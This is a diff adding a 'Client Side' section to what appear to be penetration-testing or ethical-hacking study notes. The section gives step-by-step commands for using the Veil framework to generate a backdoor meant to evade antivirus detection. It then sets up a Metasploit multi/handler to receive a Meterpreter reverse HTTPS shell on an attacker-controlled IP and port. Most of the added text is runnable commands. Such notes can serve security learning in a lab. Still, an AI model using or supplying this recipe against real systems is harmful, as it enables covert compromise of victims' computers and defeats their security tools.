@@ -64,6 +64,50 @@ exploit
 
 ## Client Side
 
+---
+
 * These attacks require user interaction and should be attempted if server-side attacks do not work.
+
+* We can use Veil framework to generate backdoors which cannot be detected by anti-virus softwares.
+
+```shell
+veil
+
+use 1 #uses evasion
+
+list #shows list of payloads
+
+use 15 #uses particular payload
+
+set LHOST 10.0.2.7 #value as our IP
+
+set LPORT 8080
+
+set PROCESSORS 1 #making the payload unique by setting properties values
+
+set SLEEP 5
+
+generate #generate the backdoor
+```
+
+* Once backdoor is generated, we can check if it is detected by antivirus programs.
+
+* To listen for incoming connections:
+
+```shell
+msfconsole
+
+use exploit/multi/handler #module for listening incoming connections
+
+show options
+
+set PAYLOAD windows/meterpreter/reverse_https #set payload option
+
+set LHOST 10.0.2.7 #set lhost as ip address
+
+set LPORT 8080
+
+exploit
+```
 
 ---
